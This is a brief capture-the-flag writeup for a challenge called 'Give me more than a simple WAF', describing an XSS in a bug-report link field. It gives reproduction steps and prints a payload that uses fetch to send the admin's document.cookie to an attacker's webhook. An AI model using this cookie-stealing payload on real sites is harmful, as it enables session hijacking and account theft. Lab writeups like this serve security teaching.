# Challenge `Give me more than a simple WAF` writeup

- Vulnerability: What type of vulnerability is being exploited
  - XSS
- Where: Where is the vulnerability present
  - `http://ssof2526.challenges.cwte.me:25252` in the `Link of the bug/feature request you want to report on.` box.
- Impact: What results of exploiting this vulnerability
  - Allows any user to inject malicious code into the website (in this case to see the admin's cookies)

## Steps to reproduce

1. Get a URL in Webhook to collect the requests
2. Encode the following script `<body onload=fetch("{webhook}?=cookie="+document.cookie)>` (where webhook is you URL).
3. Write this script into the `Link of the bug/feature request you want to report on.` box and click `Submit`.
4. When the admin opens the link the script will execute it will send a request to your webhook with their cookies (and the flag).

[(POC)](give_me_more_than_a_simple_WAF_poc.py)